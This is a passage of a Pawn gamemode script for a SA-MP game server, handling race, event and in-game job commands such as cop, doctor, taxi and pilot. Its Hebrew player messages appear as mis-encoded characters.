			if(raceinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ющ°хї");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			new rt = (!strlen(cmd)? 99:strval(cmd));
			if((rt < 0 || rt > 7) && rt != 99) return SendClientMessage(playerid,red," .ёхт ющ°хї ∙тхщ");
			cmd = strtok(cmdtext,idx);
			new rs = (!strlen(cmd)? randomEx(1,GetRaceMaxStyles(rt)):strval(cmd));
			if(rs < 1 || rs > GetRaceMaxStyles(rt)) return SendClientMessage(playerid,red," .ёшщщь ющ°хї ∙тхщ");
			StartRace(rt,rs);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .рщя ющ°хї ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndRace(reason,playerid);
		}
		else if(equal(cmd,"types"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :ёхтщ ющ°хЎщэ ~~~");
			SendClientMessage(playerid,yellow," 1 - Cars - юыхЁщх·");
			SendClientMessage(playerid,yellow," 2 - Bikes - рхЇЁхЄщэ");
			SendClientMessage(playerid,yellow," 3 - Planes - юшхёщэ");
			SendClientMessage(playerid,yellow," 4 - Boats - ёщ°х·");
			SendClientMessage(playerid,yellow," 5 - Crazy Race - ющ°хї ю∙хтЄ");
			SendClientMessage(playerid,yellow," 6 - Tires - ющ°хї ЇрЁЎ'°щэ");
		}
		else if(equal(cmd,"records"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /racing records [race type num] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /racing records 1 :·хЎрх· ∙щр ьющ°хї юыхЁщх·");
				SendClientMessage(playerid,white," /racing records 2 :·хЎрх· ∙щр ьющ°хї рхЇЁхЄщэ");
				SendClientMessage(playerid,white," /racing records 3 :·хЎрх· ∙щр ьющ°хї юшхёщэ");
				SendClientMessage(playerid,white," /racing records 4 :·хЎрх· ∙щр ьющ°хї ёщ°х·");
				SendClientMessage(playerid,white," /racing records 5 :·хЎрх· ∙щр ьющ°хї ю∙хтЄ");
				return SendClientMessage(playerid,white," /racing records 6 :·хЎрх· ∙щр ьющ°хї ЇрЁЎ'°щэ");
			}
			new rid = !IsNumeric(cmd) ? 1 : strval(cmd), rec[3];
			if(rid < 1 || rid > 5) return SendClientMessage(playerid,red," .юёЇ° ющ°хї ∙тхщ");
			if(rid == 1) rtype = "юыхЁщх·";
			else if(rid == 2) rtype = "рхЇЁхЄщэ";
			else if(rid == 3) rtype = "юшхёщэ";
			else if(rid == 4) rtype = "ёщ°х·";
			else if(rid == 5) rtype = "ю∙хтЄ";
			else if(rid == 5) rtype = "ЇрЁЎ'°щэ";
			rid--;
			format(string,sizeof(string)," ~~~ :·хЎрх· ∙щр - ющ°хї %s ~~~",rtype);
			SendClientMessage(playerid,lightblue,string);
			for(new i = 1, m = GetRaceMaxStyles(rid); i <= m; i++)
			{
				for(new j = 0; j < 3; j++)
				{
					format(string,sizeof(string),"Race_%d_%d_Record%d",rid,i,j);
					rec[j] = fgetint(file_racerecords,string);
				}
				format(string,sizeof(string),"Race_%d_%d_RecordN",rid,i);
				if(fkeyexist(file_racerecords,string)) format(cmd,sizeof(cmd),fgetstring(file_racerecords,string));
				else cmd = "None";
				format(string,sizeof(string)," Х [%02d:%02d:%02d] %s :юёьхь #%d",rec[2],rec[1],rec[0],cmd,i);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ющ°хї ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/swar"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /swar [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /swar state :фЎт· юЎс юьчю· ф∙°· фЁхычщ·");
			SendClientMessage(playerid,white," /swar join :фЎш°Їх· ьюьчю· ф∙°·");
			SendClientMessage(playerid,white," /swar quit :Ї°щ∙ф ююьчю· ф∙°·");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /swar start :ф·чь· юьчюф чу∙ф");
				SendClientMessage(playerid,white," /swar end [reason] :ёщхэ фюьчюф фЁхычщ·");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(warinfo[0])
			{
				if(warinfo[2] > 1)
				{
					format(string,sizeof(string)," .щ∙ ыЄ· юьчю· ∙°· хфщр ··чщь сЄху %d ∙Ёщх·",warinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· юьчю· ∙°· хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· юьчю· ∙°·");
		}
		else if(equal(cmd,"join"))
		{
			if(!warinfo[0]) return SendClientMessage(playerid,red," .рщя юьчю· ∙°· ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitwar]) return SendClientMessage(playerid,red," .юьчю· ф∙°· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inwar]) return SendClientMessage(playerid,red," .р·ф ыс° сюьчю· ф∙°·");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(warinfo[1] >= sizeof(WarPositions_1)) return SendClientMessage(playerid,red," .ыь фюўхюх· сюьчю· ф∙°· ·Їхёщэ");
			if(warinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitwar] = 1;
			playerinfo[playerid][warid] = warinfo[1];
			warinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ьюьчю· ф∙°· Х Х");
			SendClientMessage(playerid,green," - !юш°·ъ фщр ьф°хт р· ыь ф∙чўЁщэ ∙фЎш°Їх ьюьчюф");
			SendClientMessage(playerid,green," - р·ф Єхюу ьўсь ёхт ∙ь Ё∙ў рў°рщ, сх ·Ўш°ъ ьф∙·ю∙ Єь юЁ· ьчёь р· ∙р° фщ°щсщэ");
			SendClientMessage(playerid,green," - !рэ ·∙р° рч°хя Єь сю· фў°с ·ЁЎч");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",warinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!warinfo[0]) return SendClientMessage(playerid,red," .рщя юьчю· ∙°· ы°тЄ");
			if(!playerinfo[playerid][inwar]) return SendClientMessage(playerid,red," .р·ф ьр сюьчю· ф∙°·");
			SendClientMessage(playerid,green," .Ї°∙· ююьчю· ф∙°·");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(warinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ юьчюф");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartWar();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!warinfo[0]) return SendClientMessage(playerid,red," .рщя юьчюф ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndWar(reason,playerid);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· юьчю· ∙°· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/cop"))
	{
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· суюх· ∙ь ∙хш° сыущ ьсухў ющуЄ Єь ∙хш°щэ");
		SendClientMessage(playerid,lightblue," ~~~ :∙хш°щэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь ∙хш° ьф°хт р· тх°ющ ф°Є: юхы°щ фЁ∙ўщэ хф°хЎчщэ");
		SendClientMessage(playerid,pink," .Єь ыь ф°щтф ∙ь ∙чўя \"°Є\" ф∙хш° ффх°т щщўсь р· ыёє фЁ°Ўч, 250$ хтэ Єьщщ· °ю· ∙хш°");
		SendClientMessage(playerid,pink," .ь∙хш° ∙ф°т ∙чўя чє юЇ∙Є, щщ°ух 100$ | ь∙чўя ∙ф°т ∙хш° щщ°ух 150$");
		SendClientMessage(playerid,yellow," /becop :ыущ ьфщх· ∙хш° щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· ∙хш°щэ");
		SendClientMessage(playerid,purple," (сёхт°щщэ °∙хюф °ю· ф∙хш° фу°х∙ф, Ёщ·я ьф∙·ю∙ сЇўхух· сыь °ю· ∙чўя)");
		SendClientMessage(playerid,yellow," /getwanted(1) /getclevel(1) /getgun(8) /fetter(17) /gotocop(30)");
		return 1;
	}
	if(equal(cmd,"/becop"))
	{
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· суюх· ∙ь ∙хш° сыущ ьЄсху с·х° ∙хш°");
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		playerinfo[playerid][work] = work_cop;
		playerinfo[playerid][coplevel] = 1;
		SendClientMessage(playerid,blue," /cop :ыЄ· р·ф ∙хш°. ьющуЄ Єь ∙хш°щэ ф∙·ю∙ сЇўхуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° ∙хш° %s",GetName(playerid));
		SendClientMessageToAll(blue,msg);
		return 1;
	}
	if(equal(cmd,"/getwanted"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ∙хш°");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getwanted [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][work] == work_cop) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсухў °ю· юсхў∙х· ∙ь ∙хш°щэ");
		format(string,sizeof(string)," .фщр %d %s °ю· фюсхў∙х· ∙ь",playerinfo[id][wantedlevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/getclevel"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ∙хш°");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getclevel [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр ∙хш°");
		format(string,sizeof(string)," .фщр %d %s °ю· ф∙хш° ∙ь",playerinfo[id][coplevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/getgun"))
	{
 		new gunid, string[M_S];
		if(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287 && playerinfo[playerid][work] == work_cop)
		{
			if(playerinfo[playerid][coplevel] < 8) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· ∙хш° 8");
			if(CheckIfCommandUsed(playerid,3)) return 1;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /getgun [pistol/shotgun/tec9] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"pistol")) gunid = 22;
			else if(equal(cmd,"shotgun")) gunid = 25;
			else if(equal(cmd,"tec9")) gunid = 32;
			else return SendClientMessage(playerid,red," .∙э Ё∙ў ∙тхщ");
			format(string,sizeof(string)," .%s ўщсь·",WeaponName(gunid));
			SendClientMessage(playerid,green,string);
			GiveWeapon(playerid,gunid,randomEx(5,200));
		}
		else if(playerinfo[playerid][work] == work_killer)
		{
			if(playerinfo[playerid][killerlevel] < 10) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· °хЎч 10");
			if(CheckIfCommandUsed(playerid,3)) return 1;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /getgun [deagle/ak47/sniper] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"deagle")) gunid = 24;
			else if(equal(cmd,"ak47")) gunid = 30;
			else if(equal(cmd,"sniper")) gunid = 34;
			else return SendClientMessage(playerid,red," .∙э Ё∙ў ∙тхщ");
			format(string,sizeof(string)," .%s ўщсь·",WeaponName(gunid));
			SendClientMessage(playerid,green,string);
			GiveWeapon(playerid,gunid,randomEx(20,150));
		}
		else return SendClientMessage(playerid,red," .Єьщъ ьфщх· ∙хш° рх °хЎч ь∙щюх∙ сЇўхуф цх");
		return 1;
	}
	if(equal(cmd,"/fetter"))
	{
 		new id, string[M_S], Float:p[3];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ∙хш°");
		if(playerinfo[playerid][coplevel] < 17) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· ∙хш° 17");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /fetter [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя");
		if(playerinfo[id][work] == work_cop) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙щэ рцщўщэ ь∙хш°щэ");
		if(playerinfo[id][frozen][0]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ЁюЎр сфўЇрф");
		format(string,sizeof(string)," .%s ∙ю· рцщўщэ ь",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .х·∙хч°° сЄху 5 ∙Ёщх· %s ўщсь· рцщўщэ ю",GetName(playerid));
		SendClientMessage(id,red,string);
		if(playerinfo[id][work] == work_weapons || playerinfo[id][work] == work_killer) return ExitWork(id," Ё·Їё Єь щущ ∙хш°");
		SetFreeze(id,1);
		SetTimerEx("UnFreeze",5000,0,"d",id);
		return 1;
	}
	if(equal(cmd,"/gotocop"))
	{
 		new id, Float:p[3], string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ∙хш°");
		if(playerinfo[playerid][coplevel] < 30) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· ∙хш° 30");
		if(CheckIfCommandUsed(playerid,4)) return 1;
		if(!CanBeTeleported(playerid)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /gotocop [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр ∙хш°");
		format(string,sizeof(string)," .%s ф∙·т°· ь∙хш°",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ф∙·т° рьщъ %s ф∙хш°",GetName(playerid));
		SendClientMessage(id,green,string);
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(!GetPlayerInterior(id)) SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]+4.000000,playerid);
			else SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		}
		else SetPlayerPos(playerid,p[0],p[1],p[2]+3.000000);
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		return 1;
	}
	if(equal(cmd,"/doctor"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°хЇрщэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь °хЇр ьшЇь с∙чўЁщэ сЄьщ юЄш чщщэ су°ъ Їўху· °щЇхщ");
		SendClientMessage(playerid,pink," .Єь ыь °щЇхщ ∙чўя, ф°хЇр щщўсь 300$ хЄьщщ· °ю· °хЇр");
		SendClientMessage(playerid,pink," .ь°хЇр ∙щщшЇь с∙чўя с°щр щщ°ух 100$ | ь∙чўя ∙щщф°хт °хЇр щщ°ух 500$");
		SendClientMessage(playerid,pink," .°хЇрщэ ьр щыхьщэ ь°Їрх· рчу р· ф∙Ёщ");
		SendClientMessage(playerid,yellow," /bedoctor :ыущ ьфщх· °хЇр щ∙ ьфўьщу р· фЇўхуф");
		SendClientMessage(playerid,purple," :Їўхух· °хЇрщэ");
		SendClientMessage(playerid,purple," (сёхт°щщэ °∙хюф °ю· ф°хЇр фу°х∙ф, Ёщ·я ьф∙·ю∙ сЇўхух· сыь °ю· ∙чўя)");
		SendClientMessage(playerid,yellow," /pheal(1) /gotohospital(6)");
		return 1;
	}
	if(equal(cmd,"/bedoctor"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 416) return SendClientMessage(playerid,red," .Єьщъ ьфщх· срюсхьЁё сыущ ьфщх· °хЇр");
		playerinfo[playerid][work] = work_doctor;
		playerinfo[playerid][doctorlevel] = 1;
		SendClientMessage(playerid,blue," /doctor :ыЄ· р·ф °хЇр. ьющуЄ Єь °хЇрщэ ф∙·ю∙ сЇўхуф");
		new msg[64];
		format(msg,sizeof(msg)," ** !фчь ьЄсху с·х° °хЇр %s",GetName(playerid));
		SendClientMessageToAll(lightpink,msg);
		return 1;
	}
	if(equal(cmd,"/pheal"))
	{
 		new id, string[M_S], Float:h;
		if(playerinfo[playerid][work] != work_doctor) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· °хЇр");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pheal [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(GetDistanceBetweenPlayers(playerid,id) > 7.500000) return SendClientMessage(playerid,red," .ф∙чўя Ў°щъ ьфщх· ў°хс рьщъ");
		if(playerinfo[id][work] == work_doctor) return SendClientMessage(playerid,red," .°хЇр ьр щыхь ь°Їрх· °хЇр рч°");
		GetPlayerHealth(id,h);
		if(h >= 100.0)
		{
			SendClientMessage(playerid,red," !°щЇщ· ∙чўя с°щр, щщ°ух ьъ 10$");
			GiveMoney(playerid,0-10,8);
			if(GetMoney(playerid) < 0) ExitWork(playerid," °щЇхщ ∙чўЁщэ с°щрщэ");
			return 1;
		}
		format(string,sizeof(string)," .%s °щЇщ· р·",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .°щЇр рх·ъ %s ф°хЇр",GetName(playerid));
		SendClientMessage(id,red,string);
		SetPlayerHealth(id,100.0);
		playerinfo[playerid][doctorlevel]++;
		return 1;
	}
	if(equal(cmd,"/gotohospital"))
	{
		if(playerinfo[playerid][work] != work_doctor) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· °хЇр");
		if(playerinfo[playerid][doctorlevel] < 6) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· °хЇр 6");
		if(CheckIfCommandUsed(playerid,5)) return 1;
		if(!CanBeTeleported(playerid)) return 1;
		SendClientMessage(playerid,green," .ф∙·т°· ьсщ· фчхьщэ");
		if(IsPlayerInAnyVehicle(playerid))
		{
			SetVehiclePos(GetPlayerVehicleID(playerid),1606.0957,1825.4957,10.8203,playerid);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),4.5332);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
		}
		else
		{
			SetPlayerPos(playerid,1606.0957,1825.4957,10.8203);
			SetPlayerFacingAngle(playerid,4.5332);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetPlayerInterior(playerid,0);
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerInterior(playerid,0);
		return 1;
	}
	if(equal(cmd,"/taxid"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :Ёфтщ юхЁщ· ~~~");
		SendClientMessage(playerid,pink," .Єь ыь Ёфт ьфёщЄ ∙чўЁщэ ююўхэ ьюўхэ");
		SendClientMessage(playerid,pink," .ь∙чўя ∙щщф°хт Ёфт юхЁщ· щщ°ух 200$");
		SendClientMessage(playerid,pink," .с°тЄ ∙фЁфт щхЎр юфюхЁщ· ∙ьх, фхр юЇёщў р· Єсху·х");
		SendClientMessage(playerid,yellow," /betaxid :ыущ ьфщх· Ёфт юхЁщ· щ∙ ьфўьщу р· фЇўхуф ыр∙° р·ф сюхЁщ·");
		return 1;
	}
	if(equal(cmd,"/betaxid"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 420) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сюхЁщ· сыущ ьфщх· Ёфт юхЁщ·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /betaxid [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 0 || amount > 1000) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
		playerinfo[playerid][work] = work_taxi;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !фчь ьЄсху с·х° Ёфт юхЁщ· сЄу %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/busd"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :Ёфтщ рхшхсхё ~~~");
		SendClientMessage(playerid,pink," .Єь ыь Ёфт ьфёщЄ ∙чўЁщэ ююўхэ ьюўхэ");
		SendClientMessage(playerid,pink," .ь∙чўя ∙щщф°хт Ёфт рхшхсхё щщ°ух 300$");
		SendClientMessage(playerid,pink," .с°тЄ ∙фЁфт щхЎр юфрхшхсхё ∙ьх, фхр юЇёщў р· Єсху·х");
		SendClientMessage(playerid,yellow," /bebusd :ыущ ьфщх· Ёфт рхшхсхё щ∙ ьфўьщу р· фЇўхуф ыр∙° р·ф срхшхсхё");
		return 1;
	}
	if(equal(cmd,"/bebusd"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 431) return SendClientMessage(playerid,red," .Єьщъ ьфщх· срхшхсхё сыущ ьфщх· Ёфт рхшхсхё");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bebusd [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 0 || amount > 1200) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
		playerinfo[playerid][work] = work_bus;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !фчь ьЄсху с·х° Ёфт рхшхсхё сЄу %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/traind"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :Ёфтщ °ыс· ~~~");
		SendClientMessage(playerid,pink," .Єь ыь Ёфт ьфёщЄ ∙чўЁщэ ю·чЁф ь·чЁф");
		SendClientMessage(playerid,pink," .ь∙чўя ∙щщф°хт Ёфт °ыс· щщ°ух 1000$");
		SendClientMessage(playerid,pink," .с°тЄ ∙фЁфт щхЎр юф°ыс· ∙ьх, фхр юЇёщў р· Єсху·х");
		SendClientMessage(playerid,yellow," /betraind :ыущ ьфщх· Ёфт °ыс· щ∙ ьфўьщу р· фЇўхуф ыр∙° р·ф с°ыс·");
		return 1;
	}
	if(equal(cmd,"/betraind"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 538 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 537) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс· сыущ ьфщх· Ёфт с°ыс·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /betraind [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 0 || amount > 1500) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
		playerinfo[playerid][work] = work_train;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !фчь ьЄсху с·х° Ёфт °ыс· сЄу %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/pilot"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :шщщёщэ ~~~");
		SendClientMessage(playerid,pink," .Єь ыь шщщё ьфшщё ∙чўЁщэ ююўхэ ьюўхэ");
		SendClientMessage(playerid,pink," .ь∙чўя ∙щщф°хт шщщё щщ°ух 1000$");
		SendClientMessage(playerid,pink," .с°тЄ ∙фшщщё щхЎр юффьщўхЇш° ∙ьх, фхр юЇёщу р· Єсху·х");
		SendClientMessage(playerid,yellow," /bepilot :Maverick ыущ ьфщх· шщщё щ∙ ьфўьщу р· фЇўхуф ыр∙° р·ф сфьщўхЇш°");
		return 1;
	}
	if(equal(cmd,"/bepilot"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сЄсхуф ыь∙фщ·");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 487) return SendClientMessage(playerid,red," .сыущ ьфщх· шщщё Maverick Єьщъ ьфщх· сфьщўхЇш°");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bepilot [amount] :Ўх°· ф∙щюх∙");
		amount = strval(cmd);
		if(amount < 0 || amount > 1300) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
		playerinfo[playerid][work] = work_pilot;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !фчь ьЄсху с·х° шщщё сЄу %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/sweapons"))
	{
